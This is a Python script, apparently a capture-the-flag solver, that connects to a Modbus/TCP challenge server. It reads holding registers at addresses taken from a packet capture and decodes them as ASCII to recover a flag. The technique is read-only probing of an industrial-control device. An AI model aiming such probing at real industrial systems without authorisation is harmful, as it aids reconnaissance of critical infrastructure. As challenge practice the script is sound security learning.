import socket
from umodbus import conf
from umodbus.client import tcp

conf.SIGNED_VALUES = False

# Target from challenge
HOST = '154.57.164.83'
PORT = 31922
UNIT_ID = 52  # 0x34, seen in all PCAP packets

# Register addresses seen in FC16 (Write Multiple Registers) responses in PCAP
FC16_REGS = [6,10,12,21,22,26,47,53,63,77,83,86,89,95,96,104,123,
             128,131,134,139,143,144,145,153,163,168,173,179,193,
             206,210,214,215,219,221,224,225,226,231,239,253]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((HOST, PORT))
print(f"[+] Connected to {HOST}:{PORT}")

# Strategy 1: Read each specific register seen in PCAP
print("\n[*] Reading specific registers from PCAP FC16 addresses...")
reg_values = {}
for reg in FC16_REGS:
    try:
        msg = tcp.read_holding_registers(slave_id=UNIT_ID, starting_address=reg, quantity=1)
        data = tcp.send_message(msg, sock)
        reg_values[reg] = data[0]
        char = chr(data[0]) if 32 <= data[0] <= 126 else f'[{data[0]}]'
        print(f"  Reg {reg:3d}: {data[0]:5d} (0x{data[0]:04x}) = '{char}'")
    except Exception as e:
        print(f"  Reg {reg:3d}: ERROR - {e}")

print()
print("[*] Register values as ASCII sequence:")
chars = ''.join(chr(v) if 32 <= v <= 126 else f'[{v}]' for v in reg_values.values())
print(f"  {chars}")

# Strategy 2: Read a broad range 0-260 to catch everything
print("\n[*] Reading holding registers 0-260 in bulk...")
try:
    msg = tcp.read_holding_registers(slave_id=UNIT_ID, starting_address=0, quantity=125)
    data = tcp.send_message(msg, sock)
    print("  Regs 0-124:", data)
    # Look for flag pattern (HTB{ or printable runs)
    printable = ''.join(chr(v) if 32 <= v <= 126 else '.' for v in data)
    print(f"  ASCII: {printable}")
except Exception as e:
    print(f"  Bulk read error: {e}")

sock.close()
